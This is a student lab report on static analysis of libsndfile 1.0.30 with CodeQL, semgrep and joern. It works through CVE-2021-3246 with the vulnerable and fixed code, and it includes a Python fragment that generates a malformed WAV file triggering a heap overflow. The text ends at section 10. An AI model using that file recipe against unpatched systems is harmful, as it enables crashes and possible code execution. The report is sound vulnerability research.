Министерство науки и высшего образования Российской Федерации

Санкт-Петербургский политехнический университет Петра Великого

Институт компьютерных наук и кибербезопасности

Высшая школа кибербезопасности

# ОТЧЁТ ПО ЛАБОРАТОРНОЙ РАБОТЕ № 4

## «Использование средств статического анализа кода для оценки безопасности приложений»

по дисциплине «Модели безопасности компьютерных систем»

| | |
|---|---|
| Выполнил | студент гр. 5131001/30501 Чупров Е. А. |
| Проверил | ассистент Жуковский Е. В. |

Санкт-Петербург

2026

---

## Содержание

1. Цель работы
2. Формулировка задания и выбранный вариант
3. Выбранные типы ошибок (CWE) и правила CodeQL
4. Описание исследуемого ПО
5. Исследуемая уязвимость CVE-2021-3246
6. Proof of Concept
7. Уязвимый код и код исправления
8. Штатные правила semgrep: формат и принципы работы
9. Штатные правила joern: формат и принципы работы
10. Результаты анализа средством CodeQL
11. Результаты анализа средством semgrep
12. Результаты анализа средством joern
13. Разработанные правила обнаружения уязвимости
14. Выводы
15. Список источников

Приложение А. Структура работы и команды воспроизведения

Приложение Б. Полный текст генератора PoC

Приложение В. Полный текст правила joern

---

## 1. Цель работы

Изучение распространённых типов уязвимостей и средств их выявления на основе статического анализа исходного кода (SAST, Static Application Security Testing).

В ходе работы требуется выбрать открытое ПО на языке варианта, изучить пять типов ошибок (CWE) и правила CodeQL, провести анализ ПО тремя средствами (CodeQL, semgrep, третье средство по варианту), исследовать конкретную CVE, написать PoC, показать уязвимый код и исправление, а также разработать собственные правила обнаружения этой уязвимости для всех трёх средств.

## 2. Формулировка задания и выбранный вариант

Вариант 4 по таблице 1 задания:

| Параметр | Значение |
|---|---|
| Язык программирования | C/C++ |
| Третье средство анализа | joern |
| Исследуемое ПО | libsndfile 1.0.30 |
| Исследуемая уязвимость | CVE-2021-3246 |

Задание выполнено в следующем объёме:

1. Выбраны пять CWE, критичных для C-кода, разбирающего недоверенные файлы: CWE-120, CWE-190, CWE-129, CWE-457, CWE-468.
2. Изучены соответствующие штатные запросы CodeQL из пакета codeql/cpp-queries и примеры уязвимого кода.
3. Проведён анализ libsndfile 1.0.30 средством CodeQL, результаты прокомментированы, часть срабатываний отмечена как ложные.
4. Исследована CVE-2021-3246: причина, условия эксплуатации, PoC, уязвимый код и код исправления.
5. Разработано правило CodeQL, выявляющее уязвимость в 1.0.30.
6. Проведён анализ средством semgrep штатными наборами и разработано своё правило.
7. Проведён анализ средством joern штатным набором joern-scan и разработано своё правило на Scala.
8. Подготовлен отчёт с результатами, текстами правил и командами воспроизведения.

## 3. Выбранные типы ошибок (CWE) и правила CodeQL

Для C-библиотеки, которая разбирает файлы форматов WAV, AIFF, AU, FLAC, OGG и другие, наиболее опасны ошибки работы с памятью и целочисленной арифметикой на данных из файла. Выбраны пять типов:

| CWE | Класс ошибки | Запрос CodeQL | Важность / точность | Найдено в 1.0.30 |
|---|---|---|---|---|
| CWE-120 | Переполнение буфера при записи | cpp/unbounded-write | error, medium | 0 |
| CWE-190 | Целочисленное переполнение | cpp/integer-overflow-tainted | warning, low | 290 |
| CWE-129 | Непроверенный индекс массива | cpp/unclear-array-index-validation | warning, low | 8 |
| CWE-457 | Условно неинициализированная переменная | cpp/conditionally-uninitialized-variable | warning | 2 |
| CWE-468 | Неверное масштабирование указателя | cpp/suspicious-add-sizeof | warning, high | 1 |

Все запросы входят в пакет codeql/cpp-queries версии 1.9.2, каталог Security/CWE. Набор выбран с учётом состава пакета: отдельных штатных запросов CWE-476 (разыменование NULL) и CWE-125 (чтение за границей) в C++-пакете нет, поэтому вместо них взяты CWE-457 и CWE-468 — также приводящие к порче памяти и неопределённому поведению. Ниже кратко описаны принципы работы запросов и результаты.

### 3.1. CWE-120: переполнение буфера при записи

Запрос cpp/unbounded-write — path-problem. Он ищет операции записи в буфер, длина которых не контролируется, и строит путь от источника недоверенных данных до sink'а. В основе лежит библиотека semmle.code.cpp.security.BufferWrite и taint-анализ: источник — данные, прочитанные из файла или командной строки, sink — копирование в буфер (strcpy, memcpy, sprintf и т. п.). Запрос проверяет, ограничена ли длина записи размером приёмника, и не считает срабатыванием случаи, где размер явно проверен.

На libsndfile 1.0.30 запрос не дал ни одного срабатывания. Это ожидаемо: библиотека почти везде передаёт длину явно и проверяет её вручную, а исследованная CVE-2021-3246 — не прямое неограниченное копирование, а логическая ошибка согласования двух размеров (blockalign и samplesperblock). Такой дефект не описывается моделью «недоверенная длина → запись» и требует отдельного правила. Этот результат показывает границу применимости штатного запроса и обосновывает разработку собственного правила.

### 3.2. CWE-190: целочисленное переполнение

Запрос cpp/integer-overflow-tainted ищет арифметические выражения над недоверенными данными, которые могут переполниться. Используется taint-анализ от FlowSources (чтение из файла, аргументы командной строки) и SimpleRangeAnalysis для оценки диапазонов. Запрос имеет низкую точность: он сообщает о любом потенциально переполняющемся выражении, даже если результат затем маскируется или приводится к меньшему типу.

Получено 290 срабатываний. Больше всего:

| Файл | Срабатываний |
|---|---|
| src/GSM610/gsm_decode.c | 153 |
| src/sfendian.h | 23 |
| src/nms_adpcm.c | 17 |
| src/sd2.c | 15 |
| src/ms_adpcm.c | 13 |
| src/double64.c | 12 |

Пример — src/GSM610/gsm_decode.c:

    sr |= (uint16_t) *c++ << 2 ;
    xmc [3] = sr & 0x7 ; sr >>= 3 ;

Здесь sr — 16-битный регистр, сдвиги и маски являются частью распаковки битового потока; переполнение если и возможно, то является ожидаемым усечением. Большинство из 290 срабатываний относятся к таким местам и помечены как ложные. Несколько срабатываний в ALACBitUtilities.c и double64.c требуют ручной проверки, но прямого отношения к исследуемой CVE не имеют. Вывод: штатный запрос CWE-190 для этой библиотеки слишком шумный. Само правило не изменялось. Сужение до выделения памяти и индексации уменьшило бы число отчётов, но исследуемая CVE всё равно не является целочисленным переполнением, и штатный запрос её не описывает. Срабатывания разобраны вручную в этом разделе.

### 3.3. CWE-129: непроверенный индекс массива

Запрос cpp/unclear-array-index-validation — path-problem. Он ищет доступ к массиву по индексу, полученному из недоверенных данных, без предварительной проверки границ. Используются IRGuards (анализ условий-охранников) и taint-анализ. Точность низкая.

Найдено 8 срабатываний, в том числе:

| Файл:строка | Комментарий |
|---|---|
| src/GSM610/long_term.c:914 | индекс зависит от прочитанных данных; требует проверки |
| src/ima_adpcm.c:468 | индекс из блока ADPCM; требует проверки |
| src/ima_oki_adpcm.c:77, :86 | аналогично |
| src/ms_adpcm.c:292 | ложное: bytecode предварительно ограничен & 0xF |
| src/sd2.c:317, :325, :333 | индексы из заголовка; требует проверки |

Пример ложного срабатывания в src/ms_adpcm.c:

    bytecode = pms->samples [k] & 0xF ;
    ...
    chan_idelta [chan] = (AdaptationTable [bytecode] * idelta) >> 8 ;

AdaptationTable содержит 16 элементов, а bytecode после & 0xF находится в диапазоне 0…15, поэтому выхода за границу нет. CodeQL не выводит эту связь из маски и считает индекс недоверенным.

### 3.4. CWE-457: условно неинициализированная переменная

Запрос cpp/conditionally-uninitialized-variable ищет функции инициализации, статус возврата которых не проверяется, из-за чего локальная переменная может остаться неинициализированной. Используется SSA-анализ и список функций, которые инициализируют выходной параметр только при успехе.

Найдено 2 срабатывания:

| Файл:строка | Комментарий |
|---|---|
| programs/common.c:57 | статус sf_command не проверен, max может остаться неинициализированным |
| programs/sndfile-info.c:256 | то же для signal_max |

Оба срабатывания — истинные, но находятся в консольных программах, а не в самой библиотеке. Практический эффект — неверный вывод или неопределённое поведение при ошибке sf_command, не память библиотеки.

### 3.5. CWE-468: неверное масштабирование указателя

Запрос cpp/suspicious-add-sizeof ищет выражения вида ptr + sizeof(...), где ptr не является char * или void *. В таком выражении смещение масштабируется размером элемента указателя, то есть фактически применяется дважды. Точность высокая.

Найдено одно срабатывание — src/nms_adpcm.c:707:

    unsigned short block [NMS_BLOCK_SHORTS_32] ;
    ...
    memset (pnms->block + (k * sizeof (short)), 0,
            (pnms->shortsperblock - k) * sizeof (short)) ;

pnms->block имеет тип unsigned short *, поэтому pnms->block + k * sizeof(short) смещает указатель на k * sizeof(short) * sizeof(short) байт, а не на k * sizeof(short). Это истинное срабатывание: при определённых k memset выйдет за пределы массива block. Ошибка не является исследуемой CVE, но показывает, что штатный набор CodeQL находит в libsndfile и другие реальные дефекты.

## 4. Описание исследуемого ПО

**libsndfile** — библиотека с открытым исходным кодом для чтения и записи звуковых файлов. Поддерживает WAV, AIFF, AU, RAW, FLAC, OGG/Vorbis, OGG/Opus, GSM 6.10, G.721/G.723, MS ADPCM, IMA ADPCM, NMS ADPCM и другие форматы. Библиотека используется в аудиоредакторах, плеерах, утилитах обработки звука и встроенных системах; типичный сценарий — открытие файла, полученного из недоверенного источника.

| Параметр | Значение |
|---|---|
| Версия | 1.0.30 (тег v1.0.30, 2021) |
| Язык | C |
| Объём | 104 файла .c, 56 150 строк в src/ |
| Сборка | autotools, --disable-external-libs --disable-shared --enable-static |
| Компилятор | clang 23.1.3, -std=gnu11 |
| Утилита для PoC | programs/sndfile-info |

Версия 1.0.30 выбрана потому, что в ней присутствует CVE-2021-3246, а сборка занимает около минуты и не требует внешних библиотек. Для сравнения собрана исправленная версия 1.1.0.

Основные команды сборки:

    git clone --depth 1 --branch v1.0.30 https://github.com/libsndfile/libsndfile.git
    cd libsndfile
    autoreconf -i -f
    mkdir build && cd build
    CC=clang CFLAGS="-std=gnu11 -g -O1" ../configure \
      --disable-external-libs --disable-shared --enable-static
    make -j8 programs/sndfile-info

Для PoC дополнительно собирается вариант с AddressSanitizer:

    CC=clang CFLAGS="-std=gnu11 -fsanitize=address -g -O1" \
    LDFLAGS="-fsanitize=address" ../configure \
      --disable-external-libs --disable-shared --enable-static
    make -j8 programs/sndfile-info

![Версии инструментов и проекта](screenshots/01-versions.png)

## 5. Исследуемая уязвимость CVE-2021-3246

| Параметр | Значение |
|---|---|
| CVE | CVE-2021-3246 |
| Тип ошибки | CWE-787 (out-of-bounds write), CWE-122 (heap-based buffer overflow) |
| CVSS 3.1 | 8.8 High (AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H) |
| Уязвимая версия | 1.0.30; в теге upstream 1.0.31 проверка та же |
| Исправленная версия | 1.1.0 (коммит deb669ee, 18.02.2021; релиз 27.03.2022) |
| Функции | wavlike_msadpcm_init, msadpcm_decode_block в src/ms_adpcm.c |
| PoC | WAV-файл 2660 байт, генератор в Приложении Б |

Пакеты дистрибутивов с номером 1.0.31 иногда уже содержат этот патч отдельно: Debian помечает исправление как 1.0.31-2, Ubuntu — как 1.0.31-1ubuntu1.1. В работе сравнивались теги upstream v1.0.30 и 1.1.0.

Описание: при открытии специально сформированного WAV-файла с кодеком MS ADPCM в msadpcm_decode_block происходит запись за границу кучи. Уязвимость позволяет вызвать отказ в обслуживании и, в зависимости от окружения, выполнить произвольный код. Атака требует, чтобы пользователь открыл вредоносный файл (UI:R), но не требует привилегий (PR:N).

Условия эксплуатации:

1. Приложение использует libsndfile 1.0.30 (или 1.0.31) для чтения WAV.
2. Файл имеет формат WAVE_FORMAT_EXTENSIBLE с подформатом MS ADPCM.
3. В заголовке заданы несовместимые nBlockAlign, wValidBitsPerSample и число каналов.
4. Приложение вызывает sf_open (например, sndfile-info) и доходит до инициализации кодека.

### 5.1. Причина возникновения

В wavlike_msadpcm_init параметры blockalign и samplesperblock приходят из заголовка WAV. Для обычного WAVE_FORMAT_MS_ADPCM в wavlike_read_fmt_chunk есть проверка числа каналов (1…2), но для WAVE_FORMAT_EXTENSIBLE эта ветка не выполняется, и число каналов не ограничивается.

Кроме того, в объединении WAV_FMT поля структуры msadpcm пересекаются с полями структуры ext:

    typedef struct
    {   unsigned short format ;
        unsigned short channels ;
        unsigned int   samplerate ;
        unsigned int   bytespersec ;
        unsigned short blockalign ;
        unsigned short bitwidth ;
        unsigned short extrabytes ;
        unsigned short samplesperblock ;
    } MS_ADPCM_WAV_FMT ;
    
    typedef struct
    {   unsigned short format ;
        unsigned short channels ;
        unsigned int   samplerate ;
        unsigned int   bytespersec ;
        unsigned short blockalign ;
        unsigned short bitwidth ;
        unsigned short extrabytes ;
        unsigned short validbits ;
        unsigned int   channelmask ;
        EXT_SUBFORMAT  esf ;
    } EXTENSIBLE_WAV_FMT ;

Поэтому для extensible-файла wav_fmt->msadpcm.samplesperblock фактически читает wValidBitsPerSample. В wav_read_header это значение передаётся в wavlike_msadpcm_init как samplesperblock.

Старая проверка в 1.0.30 проверяет только blockalign:

    if (blockalign < 7 * psf->sf.channels)
    {   psf_log_printf (psf, "*** Error blockalign (%d) should be > %d.\n", blockalign, 7 * psf->sf.channels) ;
        return SFE_INTERNAL ;
        } ;

Далее вычисляется count и проверяется равенство samplesperblock:

    count = 2 * (pms->blocksize - 6 * pms->channels) / pms->channels ;
    if (pms->samplesperblock != count)
        return SFE_INTERNAL ;

В PoC значения таковы, что целочисленное деление даёт count = 10, и проверка проходит:

    channels = 226
    blockalign = 2592
    samplesperblock = 10
    count = 2 * (2592 - 6 * 226) / 226 = 2472 / 226 = 10

При channels, отличном от 1, декодер берёт ветку преамбулы на два канала: пишет четыре отсчёта в индексы 0…3 и ставит blockindx = 14. Дальше запись не продолжается с индекса 4. Индекс задаётся заново:

    sampleindx = 2 * pms->channels ;   /* 2 * 226 = 452 */
    while (blockindx < pms->blocksize)
    {   bytecode = pms->block [blockindx++] ;
        pms->samples [sampleindx++] = (bytecode >> 4) & 0x0F ;
        pms->samples [sampleindx++] = bytecode & 0x0F ;
        } ;

В блоке остаётся 2592 − 14 = 2578 байт, на каждый байт пишутся два short. Это 5156 записей в индексы 452…5607.

Под отсчёты отведено channels * samplesperblock = 2260 элементов short: указатель block стоит сразу за ними. Выделение больше, в него входят и сам блок, и запас:

    pmssize = sizeof (MSADPCM_PRIVATE) + blockalign
            + 3 * channels * samplesperblock
            = 56 + 2592 + 3 * 226 * 10
            = 9428 байт.

ASan сообщает о регионе ровно в 9428 байт и о записи WRITE of size 2 сразу за его концом, в ms_adpcm.c:279. Первая запись за конец объекта приходится на индекс 4686: после заголовка структуры в куске остаётся (9428 − 56) / 2 = 4686 элементов short с индексами 0…4685.

### 5.2. Исправление

В 1.1.0 проверка blockalign < 7 * channels заменена на две проверки:

    /* There's 7 samples per channel in the preamble of each block */
    if (samplesperblock < 7 * psf->sf.channels)
    {   psf_log_printf (psf, "*** Error samplesperblock (%d) should be >= %d.\n",
                       samplesperblock, 7 * psf->sf.channels) ;
        return SFE_INTERNAL ;
        } ;
    
    if (2 * blockalign < samplesperblock * psf->sf.channels)
    {   psf_log_printf (psf, "*** Error blockalign (%d) should be >= %d.\n",
                       blockalign, samplesperblock * psf->sf.channels / 2) ;
        return SFE_INTERNAL ;
        } ;

Первая проверка требует, чтобы в блоке было достаточно места для преамбулы (7 сэмплов на канал), вторая — чтобы блок был достаточно большим для заявленного числа сэмплов. Для PoC первая проверка даёт 10 < 7 * 226 = 1582 и отклоняет файл.

### 5.3. Ссылки

- NVD: <https://nvd.nist.gov/vuln/detail/CVE-2021-3246>
- Описание в MITRE CVE: <https://cveawg.mitre.org/api/cve/CVE-2021-3246>
- Issue libsndfile: <https://github.com/libsndfile/libsndfile/issues/687>
- Коммит исправления: <https://github.com/libsndfile/libsndfile/commit/deb669ee8be55a94565f6f8a6b60890c2e7c6f32>
- Релиз 1.1.0: <https://github.com/libsndfile/libsndfile/releases/tag/1.1.0>
- OSS-Fuzz testcase: <https://oss-fuzz.com/testcase-detail/5696502087024640>
- Debian DSA-4947: <https://www.debian.org/security/2021/dsa-4947>
- Gentoo GLSA 202309-11: <https://security.gentoo.org/glsa/202309-11>

## 6. Proof of Concept

PoC — WAV-файл, который создаётся скриптом poc/gen_msadpcm_poc.py. Файл содержит корректную RIFF-структуру, fmt -чанк размера 40 (WAVE_FORMAT_EXTENSIBLE) и data-чанк на 2592 байта. Ключевые параметры:

| Поле | Значение | Комментарий |
|---|---|---|
| wFormatTag | 0xFFFE | WAVE_FORMAT_EXTENSIBLE |
| SubFormat GUID | 00000002-0000-0010-8000-00AA00389B71 | MS ADPCM |
| nChannels | 226 | проверка каналов для extensible не выполняется |
| nBlockAlign | 2592 | проходит старую проверку >= 7 * 226 |
| wValidBitsPerSample | 10 | читается как samplesperblock |
| Размер data | 2592 | ровно один блок |
| Размер файла | 2660 | |

Фрагмент генератора:

    channels = 226
    blockalign = 2592
    samplesperblock = 10
    
    fmt = struct.pack("<HHIIHH", 0xFFFE, channels, 8000,
                      8000 * blockalign, blockalign, 4)
    extension = struct.pack("<HI", samplesperblock, 0) + MS_ADPCM_GUID
    fmt += struct.pack("<H", len(extension)) + extension
    data = bytes(blockalign)
    
    body = (b"WAVE" + b"fmt " + struct.pack("<I", len(fmt)) + fmt
            + b"data" + struct.pack("<I", len(data)) + data)
    blob = b"RIFF" + struct.pack("<I", len(body)) + body

Запуск на уязвимой версии с AddressSanitizer:

    python3 poc/gen_msadpcm_poc.py
    ASAN_OPTIONS=detect_leaks=0 \
      work/build/asan-1.0.30/programs/sndfile-info poc/msadpcm_poc.wav

Фрагмент вывода:

    ==<pid>==ERROR: AddressSanitizer: heap-buffer-overflow on address ...
    WRITE of size 2 at 0x... thread T0
        #0 ... in msadpcm_decode_block .../src/ms_adpcm.c:279
        #1 ... in wavlike_msadpcm_init .../src/ms_adpcm.c:171
        #2 ... in wav_open .../src/wav.c:258
        #3 ... in psf_open_file .../src/sndfile.c:3079
        #4 ... in info_dump .../programs/sndfile-info.c:226
    ...
    SUMMARY: AddressSanitizer: heap-buffer-overflow .../src/ms_adpcm.c:279
    in msadpcm_decode_block

На исправленной версии 1.1.0 тот же файл отклоняется без падения:

    Error : Not able to open input file poc/msadpcm_poc.wav.
      Channels      : 226
      Block Align   : 2592
    *** Error samplesperblock (10) should be >= 1582.

![PoC: падение 1.0.30 и отказ 1.1.0](screenshots/02-poc.png)

Оригинальный тесткейс OSS-Fuzz имеет размер 71 байт и также воспроизводит падение; в работе используется эквивалентный ему чистый файл, который проще объяснить и воспроизвести: генератор явно задаёт все поля WAV.

## 7. Уязвимый код и код исправления

### 7.1. Уязвимый код 1.0.30

src/ms_adpcm.c, wavlike_msadpcm_init:

    if (blockalign < 7 * psf->sf.channels)
    {   psf_log_printf (psf, "*** Error blockalign (%d) should be > %d.\n",
                        blockalign, 7 * psf->sf.channels) ;
        return SFE_INTERNAL ;
        } ;
    
    pmssize = sizeof (MSADPCM_PRIVATE) + blockalign
            + 3 * psf->sf.channels * samplesperblock ;
    
    if (! (psf->codec_data = calloc (1, pmssize)))
        return SFE_MALLOC_FAILED ;
    pms = (MSADPCM_PRIVATE*) psf->codec_data ;
    
    pms->samples = pms->dummydata ;
    pms->block = (unsigned char*) (pms->dummydata
                + psf->sf.channels * samplesperblock) ;
    pms->channels = psf->sf.channels ;
    pms->blocksize = blockalign ;
    pms->samplesperblock = samplesperblock ;

src/ms_adpcm.c, msadpcm_decode_block:

    sampleindx = 2 * pms->channels ;
    while (blockindx < pms->blocksize)
    {   bytecode = pms->block [blockindx++] ;
        pms->samples [sampleindx++] = (bytecode >> 4) & 0x0F ;
        pms->samples [sampleindx++] = bytecode & 0x0F ;
        } ;

Проблема: проверка blockalign не гарантирует, что samplesperblock достаточен для распаковки блока; для channels > 2 ветка преамбулы рассчитана на два канала, а размер буфера считается как channels * samplesperblock.

### 7.2. Код исправления 1.1.0

    /* There's 7 samples per channel in the preamble of each block */
    if (samplesperblock < 7 * psf->sf.channels)
    {   psf_log_printf (psf, "*** Error samplesperblock (%d) should be >= %d.\n",
                        samplesperblock, 7 * psf->sf.channels) ;
        return SFE_INTERNAL ;
        } ;
    
    if (2 * blockalign < samplesperblock * psf->sf.channels)
    {   psf_log_printf (psf, "*** Error blockalign (%d) should be >= %d.\n",
                        blockalign, samplesperblock * psf->sf.channels / 2) ;
        return SFE_INTERNAL ;
        } ;

Обе проверки выполняются до calloc, поэтому неверный файл не доходит до msadpcm_decode_block. Именно на эти проверки ориентированы собственные правила: они ищут старую (слабую) проверку blockalign в wavlike_msadpcm_init, которой в 1.1.0 уже нет.

## 8. Штатные правила semgrep: формат и принципы работы

semgrep — анализатор на основе шаблонов исходного кода. Правило описывается в YAML и состоит из идентификатора, языков, важности, сообщения и одного или нескольких шаблонов. Основные элементы:

- pattern — синтаксический шаблон с метапеременными $X и многоточием ...;
- pattern-inside — шаблон должен находиться внутри указанной конструкции (например, внутри функции);
- pattern-not / pattern-not-inside — исключения;
- metavariable-pattern, metavariable-comparison — дополнительные условия на метапеременные;
- режим mode: taint с секциями sources, sinks, sanitizers — упрощённый анализ распространения данных;
- metadata — CWE, ссылки, категория.

Правила можно писать самому или брать из реестра semgrep.dev; --config=p/… означает «пакет правил из реестра». В работе использованы три набора:

| Набор | Назначение | Правил | Файлов | Находок |
|---|---|---|---|---|
| p/c | штатный набор правил для C | 2 | 130 | 0 |
| p/default | общий набор по умолчанию | 336 | 144 | 0 |
| p/security-audit | правила security-аудита | 88 | 144 | 7 |

Штатный C-набор semgrep оказался очень небольшим: всего два правила, и на libsndfile они не сработали. Для содержательного анализа дополнительно прогнан p/security-audit; его результаты приведены ниже.

### 8.1. Результаты p/security-audit

| Правило | Файл:строка | Комментарий |
|---|---|---|
| insecure-use-printf-fn | src/G72x/g72x_test.c:78 | тестовый файл, не входит в библиотеку; низкий приоритет |
| double-free | src/alac.c:871 | требует проверки; на success-пути pakt_data освобождается один раз |
| double-free | src/test_conversions.c:88 | тестовый файл |
| use-after-free | src/wavlike.c:332 | ложное: после free указатель сразу переприсваивается calloc |
| use-after-free | src/wavlike.c:346 | то же ложное срабатывание |
| insecure-use-strcat-fn | src/common.h:991 | макрос-обёртка; предупреждение общего характера |
| insecure-use-string-copy-fn | src/common.h:997 | макрос-обёртка; предупреждение общего характера |

Пример ложного срабатывания use-after-free:

    free (psf->channel_map) ;
    if ((psf->channel_map = calloc (psf->sf.channels,
                                    sizeof (psf->channel_map [0]))) == NULL)
        return SFE_MALLOC_FAILED ;
    ...
    psf->channel_map [k++] = channel_mask_bits [bit].id ;

semgrep видит free и последующее обращение к psf->channel_map, но не учитывает, что между ними указатель получает новое значение. Это типичное ограничение шаблонного анализа без полноценного анализа потока управления.

![semgrep: штатные наборы и своё правило](screenshots/04-semgrep.png)

## 9. Штатные правила joern: формат и принципы работы

joern строит по исходникам граф свойств кода (Code Property Graph) и выполняет по нему запросы на Scala. Для языка C граф собирает фронтенд c2cpg. Запрос в штатной базе — запись с именем, автором, заголовком, описанием, баллом, метками, языком и обходом графа. В исходниках joern такая запись собирается вызовом Query.make; обход передаётся в withStrRep({ cpg => ... }), чтобы вместе с функцией сохранить её текст.

База запросов joern 4.0.669 содержит 58 запросов: C — 27, Android — 10, PHP — 9, Java — 7, Kotlin — 3, Ghidra — 2. Метка default стоит на 32 запросах, из них для C — 16. Команда joern-scan --language c запускает именно эти 16: запросы других языков и запросы C без метки default в штатный прогон не входят.

Строка результата имеет вид Result: балл : заголовок: файл:строка:функция.

Короткий пример из установленной базы — запрос format-controlled-printf, балл 4. Он выбирает вызовы printf, у которых первый аргумент не литерал, и вызовы sprintf или vsprintf, у которых второй аргумент не литерал:

    { cpg =>
        val printfFns = cpg
          .method("(?i)printf")
          .callIn
          .whereNot(_.argument.order(1).isLiteral)
        val sprintsFns = cpg
          .method("(?i)(sprintf|vsprintf)")
          .callIn
          .whereNot(_.argument.order(2).isLiteral)
        printfFns ++ sprintsFns
    }

Другой запрос той же базы, copy-loop, балл 2, устроен как эвристика. Он помечает запись в элемент массива, если индекс этого обращения встречается среди присваиваний в заголовке цикла for. Любой цикл кодека, который пишет отсчёт в буфер и увеличивает индекс, попадает в отчёт, даже когда границы цикла заданы размером буфера.

Анализ запускался так (в scripts/06-joern.sh то же самое, с JAVA_HOME на локальный Temurin 21.0.13+9):

    export JAVA_HOME=work/tools/jdk-21
    export PATH="$JAVA_HOME/bin:$PATH"
    joern-scan --language c work/src/libsndfile-1.0.30/src

Рабочий каталог joern — work/joern-runs/scan-1.0.30, он закрыт .gitignore вместе с остальным work/. На вход отдан каталог src/ целиком, 104 файла .c. Отдельного списка файлов, которые фронтенд не разобрал, joern-scan не напечатал. Файл ms_adpcm.c в граф попал: своё правило, запущенное по тому же каталогу, нашло в нём функцию wavlike_msadpcm_init.

### 9.1. Результаты штатного набора

Получено **368 срабатываний**. Распределение по запросам:

| Запрос | Балл | Находок |
|---|---|---|
| Copy loop detected | 2.0 | 293 |
| Signed Shift May Cause Undefined Behavior | 2.0 | 42 |
| Array access at fixed offset but sufficient length check not determined | 3.0 | 18 |
| Truncation in assignment involving strlen call | 2.0 | 6 |
| Two file operations on the same path can act on different files | 3.0 | 6 |
| Unchecked read/recv/malloc | 3.0 | 2 |
| Non-constant format string passed to printf/sprintf/vsprintf | 4.0 | 1 |
| **Итого** | | **368** |

Остальные девять запросов метки default для C срабатываний не дали: gets, strtok, getwd, strncpy, send, смена uid и gid, копирование в буфер из кучи, освобождение поля параметра без записи на всех путях.

Примеры строк из results/joern-builtin-1.0.30.txt:

    Result: 2.0 : Copy loop detected: ms_adpcm.c:307:msadpcm_decode_block
    Result: 2.0 : Signed Shift May Cause Undefined Behavior: ALAC/ag_dec.c:302:dyn_decomp
    Result: 3.0 : Array access at fixed offset but sufficient length check not determined: audio_detect.c:97:vote_for_format
    Result: 2.0 : Truncation in assignment involving `strlen` call: aiff.c:1440:aiff_write_header
    Result: 3.0 : Two file operations on the same path can act on different files: file_io.c:575:psf_open_fd
    Result: 3.0 : Unchecked read/recv/malloc: alac.c:826:alac_pakt_read_decode
    Result: 4.0 : Non-constant format string passed to printf/sprintf/vsprintf: common.c:1188:psf_hexdump

В файле результата у запроса про strlen заголовок содержит обратные кавычки вокруг имени функции; в таблице выше они убраны, место срабатывания то же.

Комментарии:

- 293 срабатывания Copy loop — циклы кодеков ALAC, G.72x, GSM, IMA ADPCM, MS ADPCM и NMS ADPCM. В ms_adpcm.c:307 функция msadpcm_decode_block пишет отсчёт в pms->samples[k] внутри цикла по блоку. Это обычная работа декодера. Запрос не проверяет выход за границу и исследуемую CVE не описывает.
- 42 срабатывания Signed Shift — левый сдвиг значения типа int или long, у которого не оба операнда литералы. Основная масса в ALAC (dyn_decomp, dyn_code) и в nms_adpcm.c. Запрос отмечает форму операции, а не доказанное переполнение.
- 18 срабатываний Array access относятся к одной функции audio_detect.c, vote_for_format, строки 91, 94, 97 и 100, с повторами. Внутри цикла по k код читает data[0], data[2] и data[3]. Перед циклом длина уменьшается до кратной 4, но запрос такую проверку достаточной не считает.
- 6 срабатываний про strlen — присваивание результата strlen в переменную типа int: aiff.c:1440 и aiff.c:1534, common.c:165 и common.c:391, sd2.c:282 и sd2.c:283. На 64-битной платформе size_t шире int. Для имён cue-точек и строк журнала усечение длины не выглядит достижимым; замечание формальное.
- 6 срабатываний про две файловые операции: file_io.c:575 и file_io.c:577 — две ветки одного if/else вокруг open, на одном пути исполнения выполняется только один вызов; common.c:1754 и common.c:1759 — два fopen в psf_open_tmpfile, второй строится уже с другим именем и только если первый путь не вернул файл; test_file_io.c:94 и test_file_io.c:108 — unlink в тесте после закрытия файла. К уязвимости библиотеки это не сводится.
- 2 срабатывания Unchecked read/recv/malloc: alac.c:826 — malloc без проверки результата до вызова get_chunk_data; cart.c:42 — функция cart_var_alloc возвращает результат malloc вызывающему, проверка может стоять снаружи. К CVE-2021-3246 оба места не относятся.
- Единственное срабатывание с баллом 4 — common.c:1188, функция psf_hexdump:

    printf (m == 8 ? " %02X " : "%02X ", data [k + m] & 0xFF) ;

Первый аргумент — условное выражение, а не строковый литерал, хотя обе ветки являются константными форматами. Запрос проверяет только isLiteral, поэтому тернарный оператор он считает неконстантной форматной строкой. Это ложное срабатывание.

Штатный набор CVE-2021-3246 не нашёл. В базе нет запроса про слабую проверку blockalign в разборе MS ADPCM, а срабатывания в ms_adpcm.c относятся к циклам копирования отсчётов. Для отчёта это полезный результат: универсальные запросы дают первичный список, но конкретную ошибку согласования размеров ловит отдельное правило.

![joern: штатный набор и своё правило](screenshots/05-joern.png)

## 10. Результаты анализа средством CodeQL

Для анализа создана база CodeQL по сборке 1.0.30:

    codeql database create work/db-1.0.30 --language=cpp \
      --source-root=work/src/libsndfile-1.0.30 \
      --command="$PWD/scripts/codeql-build.sh 1.0.30"

Основная часть базы (db-cpp) занимает около 80 МБ, не считая журналов экстракции; создаётся она за несколько секунд после сборки. Пять штатных запросов запускались одной командой:

    Q=work/tools/codeql/qlpacks/codeql/cpp-queries/1.9.2/Security/CWE
    codeql database analyze work/db-1.0.30 \
      "$Q/CWE-120/UnboundedWrite.ql" \
      "$Q/CWE-190/IntegerOverflowTainted.ql" \
      "$Q/CWE-129/ImproperArrayIndexValidation.ql" \
      "$Q/CWE-457/ConditionallyUninitializedVariable.ql" \
      "$Q/CWE-468/SuspiciousAddWithSizeof.ql" \
      --format=sarif-latest --output=results/codeql-cwe-1.0.30.sarif

Сводка:

| Запрос | Находок |
|---|---|
| cpp/integer-overflow-tainted | 290 |
| cpp/unclear-array-index-validation | 8 |
| cpp/conditionally-uninitialized-variable | 2 |
| cpp/suspicious-add-sizeof | 1 |
| cpp/unbounded-write | 0 |
| **Итого** | **301** |

Подробный разбор каждого запроса и примеры приведены в разделе 3. Главный вывод: штатные запросы CodeQL хорошо находят общие классы дефектов, но 290 срабатываний CWE-190 — это в основном шум низкой точности, а CWE-120 не видит исследуемую CVE, потому что она является ошибкой согласования размеров, а не неограниченным копированием.

Собственное правило cpp/lab4-msadpcm-block-size (текст в разделе 13.1) запускалось на базах 1.0.30 и 1.1.0:

    codeql database analyze work/db-1.0.30 rules/codeql/msadpcm-block-size.ql \
      --format=sarif-latest --output=results/codeql-custom-1.0.30.sarif
    codeql database analyze work/db-1.1.0 rules/codeql/msadpcm-block-size.ql \
      --format=sarif-latest --output=results/codeql-custom-1.1.0.sarif
